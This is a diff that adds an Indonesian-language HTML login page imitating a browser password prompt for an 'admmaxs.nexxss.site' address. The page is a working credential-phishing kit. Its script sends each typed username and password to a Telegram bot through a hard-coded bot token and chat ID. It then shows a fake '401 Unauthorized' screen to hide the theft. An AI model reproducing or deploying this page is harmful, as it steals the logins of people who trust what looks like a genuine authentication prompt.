@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #000;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-box {
+      width: 300px;
+    }
+    h2 {
+      margin-bottom: 10px;
+      text-align: left;
+    }
+    p {
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 8px;
+      margin-bottom: 15px;
+      border: none;
+      border-radius: 4px;
+    }
+    .btns {
+      display: flex;
+      justify-content: space-between;
+    }
+    button {
+      padding: 8px 20px;
+      border: none;
+      border-radius: 4px;
+      background-color: #444;
+      color: #fff;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #666;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <h2>Login</h2>
+    <p>https://admmaxs.nexxss.site memerlukan nama pengguna dan sandi</p>
+    <form id="loginForm">
+      <input type="text" name="username" placeholder="Nama Pengguna" required />
+      <input type="password" name="password" placeholder="Sandi" required />
+      <div class="btns">
+        <button type="button" onclick="goToUnauthorized()">Batal</button>
+        <button type="submit">Login</button>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    const botToken = "7551512248:AAG39tneoqQOS6rHMiS-83dTQ_WAa0xJ7xY";
+    const chatId = "7893111171";
+
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+      const username = this.username.value;
+      const password = this.password.value;
+      const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      }).then(() => {
+        goToUnauthorized();
+      }).catch(() => {
+        goToUnauthorized();
+      });
+    });
+
+    function goToUnauthorized() {
+      document.body.innerHTML = `
+        <div style="text-align: center; color: white; font-family: monospace;">
+          <h1>401</h1>
+          <h2>Unauthorized</h2>
+          <p>Proper authorization is required to access this resource!</p>
+        </div>`;
+    }
+  </script>
+</body>
+</html>
